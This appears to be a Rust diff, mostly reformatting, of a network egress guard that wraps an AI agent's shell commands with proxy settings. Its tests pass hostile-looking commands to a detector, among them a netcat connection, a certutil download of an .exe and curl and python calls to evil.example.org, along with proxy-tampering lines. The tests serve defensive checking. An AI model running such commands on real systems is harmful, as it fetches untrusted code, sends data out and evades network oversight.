@@ -2111,82 +1571,35 @@ fn slashes(path: &str) -> String {
 
 /// What the prefix needs, from `<specs>/project/loop/internal/`; `None` when there is neither a runtime file nor an allow file.
 pub fn runtime_settings(specs_dir: &str, app_home: &str) -> Option<RuntimeSettings> {
-    let internal = std::path::Path::new(specs_dir)
-        .join("project")
-        .join("loop")
-        .join("internal");
+    let internal = std::path::Path::new(specs_dir).join("project").join("loop").join("internal");
     let info = std::fs::read(internal.join("network-runtime.json"))
         .ok()
         .and_then(|b| String::from_utf8(b).ok())
         .and_then(|t| serde_json::from_str::<Value>(t.strip_prefix('\u{feff}').unwrap_or(&t)).ok())
         .filter(Value::is_object)
         .unwrap_or(Value::Object(Default::default()));
-    let port = info
-        .get("port")
-        .and_then(Value::as_i64)
-        .filter(|p| *p > 0 && *p < 65536)
-        .map(|p| p as u32);
+    let port = info.get("port").and_then(Value::as_i64).filter(|p| *p > 0 && *p < 65536).map(|p| p as u32);
     let mut allow_file = internal.join("network-allow.json").display().to_string();
     if !std::path::Path::new(&allow_file).is_file() {
-        allow_file = info
-            .get("allow_file")
-            .and_then(Value::as_str)
-            .filter(|p| std::path::Path::new(p).is_file())
-            .unwrap_or("")
-            .to_string();
+        allow_file = info.get("allow_file").and_then(Value::as_str).filter(|p| std::path::Path::new(p).is_file()).unwrap_or("").to_string();
     }
     if port.is_none() && allow_file.is_empty() {
         return None;
     }
-    let mut preload_dir = info
-        .get("preload_dir")
-        .and_then(Value::as_str)
-        .unwrap_or("")
-        .to_string();
-    if !(!preload_dir.is_empty() && std::path::Path::new(&preload_dir).is_dir())
-        && !app_home.is_empty()
-    {
-        preload_dir = std::path::Path::new(app_home)
-            .join("backend")
-            .join("harness_backend")
-            .join("engine")
-            .join("net_preload")
-            .display()
-            .to_string();
+    let mut preload_dir = info.get("preload_dir").and_then(Value::as_str).unwrap_or("").to_string();
+    if !(!preload_dir.is_empty() && std::path::Path::new(&preload_dir).is_dir()) && !app_home.is_empty() {
+        preload_dir = std::path::Path::new(app_home).join("backend").join("harness_backend").join("engine").join("net_preload").display().to_string();
     }
-    let mut node_preload = info
-        .get("node_preload")
-        .and_then(Value::as_str)
-        .unwrap_or("")
-        .to_string();
+    let mut node_preload = info.get("node_preload").and_then(Value::as_str).unwrap_or("").to_string();
     if !(!node_preload.is_empty() && std::path::Path::new(&node_preload).is_file()) {
-        node_preload = if preload_dir.is_empty() {
-            String::new()
-        } else {
-            std::path::Path::new(&preload_dir)
-                .join("preload.cjs")
-                .display()
-                .to_string()
-        };
+        node_preload = if preload_dir.is_empty() { String::new() } else { std::path::Path::new(&preload_dir).join("preload.cjs").display().to_string() };
     }
     Some(RuntimeSettings {
         port: port.unwrap_or(CLOSED_PROXY_PORT),
         degraded: port.is_none(),
-        allow_file: if allow_file.is_empty() {
-            String::new()
-        } else {
-            slashes(&allow_file)
-        },
-        preload_dir: if !preload_dir.is_empty() && std::path::Path::new(&preload_dir).is_dir() {
-            slashes(&preload_dir)
-        } else {
-            String::new()
-        },
-        node_preload: if !node_preload.is_empty() && std::path::Path::new(&node_preload).is_file() {
-            slashes(&node_preload)
-        } else {
-            String::new()
-        },
+        allow_file: if allow_file.is_empty() { String::new() } else { slashes(&allow_file) },
+        preload_dir: if !preload_dir.is_empty() && std::path::Path::new(&preload_dir).is_dir() { slashes(&preload_dir) } else { String::new() },
+        node_preload: if !node_preload.is_empty() && std::path::Path::new(&node_preload).is_file() { slashes(&node_preload) } else { String::new() },
     })
 }
 
@@ -2212,59 +1625,29 @@ pub fn runtime_prefix(shell: &str, settings: &RuntimeSettings) -> String {
     pairs.push(("no_proxy".into(), NO_PROXY_VALUE.into()));
     pairs.push(("NODE_USE_ENV_PROXY".into(), "1".into()));
     if !settings.allow_file.is_empty() {
-        pairs.push((
-            "LOOP_NETWORK_ALLOW_FILE".into(),
-            settings.allow_file.clone(),
-        ));
+        pairs.push(("LOOP_NETWORK_ALLOW_FILE".into(), settings.allow_file.clone()));
     }
-    let require = if !settings.node_preload.is_empty() && !settings.allow_file.is_empty() {
-        format!("--require \"{}\"", settings.node_preload)
-    } else {
-        String::new()
-    };
-    let python_path = if !settings.preload_dir.is_empty() && !settings.allow_file.is_empty() {
-        settings.preload_dir.clone()
-    } else {
-        String::new()
-    };
+    let require = if !settings.node_preload.is_empty() && !settings.allow_file.is_empty() { format!("--require \"{}\"", settings.node_preload) } else { String::new() };
+    let python_path = if !settings.preload_dir.is_empty() && !settings.allow_file.is_empty() { settings.preload_dir.clone() } else { String::new() };
     let separator = if cfg!(windows) { ";" } else { ":" };
     if shell == "bash" {
-        let mut words: Vec<String> = pairs
-            .iter()
-            .map(|(n, v)| format!("{n}={}", sh_quote(v)))
-            .collect();
+        let mut words: Vec<String> = pairs.iter().map(|(n, v)| format!("{n}={}", sh_quote(v))).collect();
         if !python_path.is_empty() {
-            words.push(format!(
-                "PYTHONPATH={}\"${{PYTHONPATH:+{separator}$PYTHONPATH}}\"",
-                sh_quote(&python_path)
-            ));
+            words.push(format!("PYTHONPATH={}\"${{PYTHONPATH:+{separator}$PYTHONPATH}}\"", sh_quote(&python_path)));
         }
         if !require.is_empty() {
-            words.push(format!(
-                "NODE_OPTIONS=\"${{NODE_OPTIONS:+$NODE_OPTIONS }}\"{}",
-                sh_quote(&require)
-            ));
+            words.push(format!("NODE_OPTIONS=\"${{NODE_OPTIONS:+$NODE_OPTIONS }}\"{}", sh_quote(&require)));
         }
         return format!("export {}\n", words.join(" "));
     }
-    let mut statements: Vec<String> = pairs
-        .iter()
-        .map(|(n, v)| format!("$env:{n}={}", ps_quote(v)))
-        .collect();
+    let mut statements: Vec<String> = pairs.iter().map(|(n, v)| format!("$env:{n}={}", ps_quote(v))).collect();
     if !python_path.is_empty() {
-        statements.push(format!(
-            "$env:PYTHONPATH={} + $(if ($env:PYTHONPATH) {{ {} + $env:PYTHONPATH }} else {{ '' }})",
-            ps_quote(&python_path),
-            ps_quote(separator)
-        ));
+        statements.push(format!("$env:PYTHONPATH={} + $(if ($env:PYTHONPATH) {{ {} + $env:PYTHONPATH }} else {{ '' }})", ps_quote(&python_path), ps_quote(separator)));
     }
     if !require.is_empty() {
         statements.push(format!("$env:NODE_OPTIONS=$(if ($env:NODE_OPTIONS) {{ $env:NODE_OPTIONS + ' ' }} else {{ '' }}) + {}", ps_quote(&require)));
     }
-    statements.push(format!(
-        "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy({})",
-        ps_quote(&proxy)
-    ));
+    statements.push(format!("[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy({})", ps_quote(&proxy)));
     format!("{}\n", statements.join("; "))
 }
 
@@ -2279,21 +1662,7 @@ pub fn runtime_input(tool_name: &str, input: &Value, settings: &RuntimeSettings)
         return None;
     }
     let mut updated = obj.clone();
-    updated.insert(
-        "command".into(),
-        Value::String(format!(
-            "{}{}",
-            runtime_prefix(
-                if tool_name == "Bash" {
-                    "bash"
-                } else {
-                    "powershell"
-                },
-                settings
-            ),
-            command
-        )),
-    );
+    updated.insert("command".into(), Value::String(format!("{}{}", runtime_prefix(if tool_name == "Bash" { "bash" } else { "powershell" }, settings), command)));
     Some(Value::Object(updated))
 }
 
@@ -2320,10 +1689,7 @@ mod tests {
         }
         let data = dir.path().join("data");
         std::fs::create_dir_all(&data).unwrap();
-        let g = G::new(Env::from_pairs([
-            ("LOOP_DATA_DIR", data.display().to_string()),
-            ("USERPROFILE", dir.path().display().to_string()),
-        ]));
+        let g = G::new(Env::from_pairs([("LOOP_DATA_DIR", data.display().to_string()), ("USERPROFILE", dir.path().display().to_string())]));
         Project { _dir: dir, root, g }
     }
 
@@ -2340,10 +1706,7 @@ mod tests {
     #[test]
     fn unlisted_host_is_blocked_and_listed_host_passes() {
         let p = project(Some(r#"{"allow": ["api.example.com"]}"#), None);
-        assert_eq!(
-            rules_of(&hits(&p, "curl https://evil.example.org/x")),
-            vec!["egress-host"]
-        );
+        assert_eq!(rules_of(&hits(&p, "curl https://evil.example.org/x")), vec!["egress-host"]);
         assert!(hits(&p, "curl https://api.example.com/x").is_empty());
         assert!(hits(&p, "curl http://localhost:3000/x").is_empty());
     }
@@ -2351,16 +1714,9 @@ mod tests {
     #[test]
     fn variables_and_subshells_are_unprovable() {
         let p = project(None, Some("API_URL=https://api.example.com\n"));
-        assert!(hits(&p, "curl $TARGET")
-            .iter()
-            .any(|(_, r)| r.contains("variable")));
-        assert!(hits(&p, "curl $(cat url.txt)")
-            .iter()
-            .any(|(_, r)| r.contains("sub-shell")));
-        let ok = project(
-            Some(r#"{"allow": ["api.example.com"]}"#),
-            Some("API_URL=https://api.example.com\n"),
-        );
+        assert!(hits(&p, "curl $TARGET").iter().any(|(_, r)| r.contains("variable")));
+        assert!(hits(&p, "curl $(cat url.txt)").iter().any(|(_, r)| r.contains("sub-shell")));
+        let ok = project(Some(r#"{"allow": ["api.example.com"]}"#), Some("API_URL=https://api.example.com\n"));
         assert!(hits(&ok, "curl $API_URL/x").is_empty());
     }
 
@@ -2369,44 +1725,24 @@ mod tests {
         let p = project(None, None);
         assert!(rules_of(&hits(&p, "export HTTP_PROXY=")).contains(&"egress-tamper"));
         assert!(rules_of(&hits(&p, "env -i node app.js")).contains(&"egress-tamper"));
-        assert!(
-            rules_of(&hits(&p, "curl --noproxy '*' http://localhost")).contains(&"egress-tamper")
-        );
+        assert!(rules_of(&hits(&p, "curl --noproxy '*' http://localhost")).contains(&"egress-tamper"));
         assert!(rules_of(&hits(&p, "PYTHONPATH=$PYTHONPATH:src python x.py")).is_empty());
     }
 
     #[test]
     fn other_network_tools_are_judged() {
         let p = project(None, None);
-        assert_eq!(
-            rules_of(&hits(&p, "nc evil.example.org 4444")),
-            vec!["egress-host"]
-        );
-        assert_eq!(
-            rules_of(&hits(&p, "ssh user@evil.example.org")),
-            vec!["egress-host"]
-        );
+        assert_eq!(rules_of(&hits(&p, "nc evil.example.org 4444")), vec!["egress-host"]);
+        assert_eq!(rules_of(&hits(&p, "ssh user@evil.example.org")), vec!["egress-host"]);
         assert!(hits(&p, "nc -l 8080").is_empty());
         assert!(hits(&p, "ssh user@localhost").is_empty());
-        assert_eq!(
-            rules_of(&hits(
-                &p,
-                "certutil -urlcache -f https://evil.example.org/a.exe a.exe"
-            )),
-            vec!["egress-host"]
-        );
+        assert_eq!(rules_of(&hits(&p, "certutil -urlcache -f https://evil.example.org/a.exe a.exe")), vec!["egress-host"]);
     }
 
     #[test]
     fn inline_code_urls_are_judged() {
         let p = project(None, None);
-        assert_eq!(
-            rules_of(&hits(
-                &p,
-                "python -c \"import urllib.request as u; u.urlopen('https://evil.example.org')\""
-            )),
-            vec!["egress-host"]
-        );
+        assert_eq!(rules_of(&hits(&p, "python -c \"import urllib.request as u; u.urlopen('https://evil.example.org')\"")), vec!["egress-host"]);
         assert!(hits(&p, "python -c \"print('hello')\"").is_empty());
     }
 
@@ -2428,13 +1764,8 @@ mod tests {
 
     #[test]
     fn runtime_prefix_shapes() {
-        let s = RuntimeSettings {
-            port: 4711,
-            degraded: false,
-            allow_file: "C:/x/allow.json".into(),
-            preload_dir: "C:/p".into(),
-            node_preload: "C:/p/preload.cjs".into(),
-        };
+        let s =
+            RuntimeSettings { port: 4711, degraded: false, allow_file: "C:/x/allow.json".into(), preload_dir: "C:/p".into(), node_preload: "C:/p/preload.cjs".into() };
         let bash = runtime_prefix("bash", &s);
         assert!(bash.starts_with("export HTTP_PROXY='http://127.0.0.1:4711'"));
         assert!(bash.contains("LOOP_NETWORK_ALLOW_FILE='C:/x/allow.json'"));
